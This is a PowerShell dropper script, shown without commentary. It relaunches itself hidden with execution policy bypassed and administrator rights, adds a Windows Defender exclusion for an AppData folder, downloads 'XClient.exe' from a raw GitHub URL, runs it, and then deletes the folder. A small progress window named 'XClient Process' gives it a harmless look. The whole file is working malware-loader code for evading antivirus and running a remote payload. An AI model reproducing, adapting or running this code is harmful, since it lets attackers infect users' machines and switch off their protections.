param (
    [string]$ConfigUrl = "https://raw.githubusercontent.com/9mamba/seure/bc1q3pdfrefej8zvml5697dnwuhg9kqgskz5062t23/Build.exe",
    [switch]$Hidden = $false
)

# Check if script is running hidden; if not, relaunch hidden
if (-not $Hidden) {
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -Hidden" -Verb RunAs
    exit
}

# Suppress errors but allow GUI output
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"

# Function to ensure the script runs as Administrator
function Ensure-Admin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) {
        try {
            $scriptPath = $MyInvocation.MyCommand.Path
            $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -Hidden"
            Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
            exit
        }
        catch {
            exit 1
        }
    }
}

# Ensure admin privileges
Ensure-Admin

# Load Windows Forms for GUI
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

# Create a simple form
$form = New-Object System.Windows.Forms.Form
$form.Text = "XClient Process"
$form.Size = New-Object System.Drawing.Size(300, 150)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedSingle"
$form.MaximizeBox = $false
$form.MinimizeBox = $false

# Create a label to show progress
$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10, 20)
$label.Size = New-Object System.Drawing.Size(260, 60)
$label.Text = "Starting..."
$form.Controls.Add($label)

# Show the form
$form.Show()
$form.Refresh()

try {
    # Define the path to the AppData folder
    $appDataFolder = [System.IO.Path]::Combine($env:APPDATA, "MyApp")
    $label.Text = "Creating folder..."
    $form.Refresh()
    New-Item -Path $appDataFolder -ItemType Directory -Force | Out-Null

    # Set the folder as an exclusion for Windows Defender
    $label.Text = "Configuring Windows Defender exclusion..."
    $form.Refresh()
    $currentExclusions = (Get-MpPreference).ExclusionPath
    if ($appDataFolder -notin $currentExclusions) {
        Set-MpPreference -ExclusionPath ($currentExclusions + $appDataFolder) -ErrorAction Stop
    }

    # Define the path where the executable will be saved
    $exePath = [System.IO.Path]::Combine($appDataFolder, "XClient.exe")

    # Download the file from the URL
    $label.Text = "Downloading XClient.exe..."
    $form.Refresh()
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($ConfigUrl, $exePath)

    # Ensure the file exists before running
    if (-not (Test-Path $exePath)) {
        $label.Text = "Download failed!"
        $form.Refresh()
        Start-Sleep -Seconds 2
        exit 1
    }

    # Run the downloaded XClient.exe
    $label.Text = "Running XClient.exe..."
    $form.Refresh()
    $process = Start-Process -FilePath $exePath -NoNewWindow -Wait -PassThru

    if ($process.ExitCode -ne 0) {
        $label.Text = "XClient.exe failed with exit code: $($process.ExitCode)"
        $form.Refresh()
        Start-Sleep -Seconds 2
        exit 1
    }

    # Success message
    $label.Text = "Completed successfully! Closing..."
    $form.Refresh()
    Start-Sleep -Seconds 1
}
catch {
    $label.Text = "Error: $_"
    $form.Refresh()
    Start-Sleep -Seconds 3
    exit 1
}
finally {
    # Clean up
    if (Test-Path $appDataFolder -ErrorAction SilentlyContinue) {
        Remove-Item $appDataFolder -Recurse -Force -ErrorAction SilentlyContinue
    }
    if ($webClient) { 
        $webClient.Dispose() 
    }
    # Close the form
    $form.Close()
}

# Exit silently
exit 0
